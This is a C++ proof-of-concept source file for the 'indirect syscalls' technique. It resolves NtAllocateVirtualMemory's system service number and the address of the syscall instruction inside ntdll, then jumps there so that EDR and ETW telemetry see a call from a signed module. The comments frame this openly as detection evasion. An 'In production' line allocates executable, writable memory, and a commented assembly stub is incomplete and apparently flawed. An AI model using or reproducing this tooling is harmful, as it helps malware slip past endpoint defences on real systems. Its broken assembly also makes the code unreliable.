#include <windows.h>
#include <stdio.h>

// Fox's Indirect Syscalls PoC
// 
// The Reality:
// Direct syscalls (executing the 'syscall' instruction from our own unbacked memory) 
// are dead. ETWti (Event Tracing for Windows - Threat Intelligence) logs the return 
// address of every syscall. If it points outside a known, signed module (like ntdll.dll), 
// the EDR flags it instantly.
//
// The Solution: Indirect Syscalls
// We dynamically resolve the System Service Number (SSN) for the API we want.
// We also dynamically find the address of the actual 'syscall' instruction INSIDE ntdll.dll.
// We set up the registers (R10, RAX), and instead of calling 'syscall' ourselves, 
// we JMP to the legitimate 'syscall' instruction inside ntdll.dll.
// 
// The Result:
// The kernel sees the syscall originating from a perfectly valid, signed Microsoft binary.

// External ASM function (defined in a separate .asm file in a real project)
// For this PoC, we declare the prototype.
extern "C" NTSTATUS FoxIndirectSyscall(
    DWORD SSN, 
    PVOID SyscallAddress, 
    ... // Variable arguments for the target API
);

// Structure to hold the resolved SSN and the address of the syscall instruction
typedef struct _SYSCALL_ENTRY {
    DWORD SSN;
    PVOID SyscallAddress;
} SYSCALL_ENTRY;

// A simplified resolver (In reality, you'd use Halo's Gate logic here to handle hooked stubs)
BOOL ResolveIndirectSyscall(const char* apiName, SYSCALL_ENTRY* entry) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PBYTE pStub = (PBYTE)GetProcAddress(hNtdll, apiName);
    if (!pStub) return FALSE;

    // 1. Find the SSN (Assuming a clean stub for this PoC: 4C 8B D1 B8 [SSN] [SSN])
    if (pStub[0] == 0x4C && pStub[1] == 0x8B && pStub[2] == 0xD1 && pStub[3] == 0xB8) {
        entry->SSN = *((PDWORD)(pStub + 4));
    } else {
        printf("[-] Stub is hooked or unrecognized. Halo's Gate logic required here.\n");
        return FALSE;
    }

    // 2. Find the 'syscall' instruction (0x0F 0x05) inside this specific stub
    // We scan forward a few bytes to find it.
    for (int i = 0; i < 32; i++) {
        if (pStub[i] == 0x0F && pStub[i+1] == 0x05) {
            entry->SyscallAddress = (PVOID)(pStub + i);
            return TRUE;
        }
    }

    printf("[-] Could not find 'syscall' instruction in the stub.\n");
    return FALSE;
}

int main() {
    printf("[+] Starting Indirect Syscalls PoC.\n");

    SYSCALL_ENTRY ntAllocEntry = { 0 };
    
    if (!ResolveIndirectSyscall("NtAllocateVirtualMemory", &ntAllocEntry)) {
        printf("[-] Failed to resolve NtAllocateVirtualMemory.\n");
        return -1;
    }

    printf("[+] Resolved NtAllocateVirtualMemory:\n");
    printf("    -> SSN: 0x%X\n", ntAllocEntry.SSN);
    printf("    -> Syscall Address (inside ntdll): %p\n", ntAllocEntry.SyscallAddress);

    // To actually execute this, you need the ASM stub.
    // The ASM stub looks like this:
    /*
    .code
    FoxIndirectSyscall PROC
        mov r10, rcx           ; Standard syscall setup
        mov eax, ecx           ; Move SSN (arg 1) into EAX
        mov r11, rdx           ; Move SyscallAddress (arg 2) into R11
        
        ; Shift the remaining arguments down (arg 3 becomes arg 1, etc.)
        ; This requires careful stack manipulation in ASM.
        
        jmp r11                ; Jump to the legitimate syscall instruction in ntdll
    FoxIndirectSyscall ENDP
    END
    */

    printf("[!] Transitioning to ASM stub to execute the indirect syscall...\n");
    printf("[!] (ASM execution omitted in this C++ PoC. See comments for the required assembly).\n");

    // In production:
    // PVOID baseAddress = NULL;
    // SIZE_T regionSize = 0x1000;
    // NTSTATUS status = FoxIndirectSyscall(ntAllocEntry.SSN, ntAllocEntry.SyscallAddress, GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    return 0;
}